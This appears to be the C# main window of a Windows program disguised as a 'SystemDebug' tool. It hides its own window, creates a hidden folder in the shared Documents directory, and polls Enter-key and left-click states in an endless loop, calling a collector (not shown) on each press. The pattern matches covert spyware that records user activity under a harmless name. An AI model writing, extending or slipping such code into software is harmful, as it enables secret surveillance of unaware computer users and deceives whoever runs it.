using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace SystemDebug
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow
    {
        private const int EnterKey = 13;
        private const int LeftMouse = 1;

        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(int i);

        public MainWindow()
        {
            var debugInformationPath =
                $"{Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments)}\\systemdebug";
            var keys = new List<int> {EnterKey, LeftMouse};

            InitializeComponent();
            Hide();
            CreateFolder(debugInformationPath);

            while (true)
            {
                foreach (var keyState in keys.Select(GetAsyncKeyState).Where(keyState => keyState > 0))
                {
                    SystemDebugCollector.GatherDebugInformation(debugInformationPath);
                }
            }
        }

        private static void CreateFolder(string path)
        {
            if (Directory.Exists(path))
            {
                return;
            }

            var createdDirectory = Directory.CreateDirectory(path);

            createdDirectory.Attributes = FileAttributes.Hidden;
        }
    }
}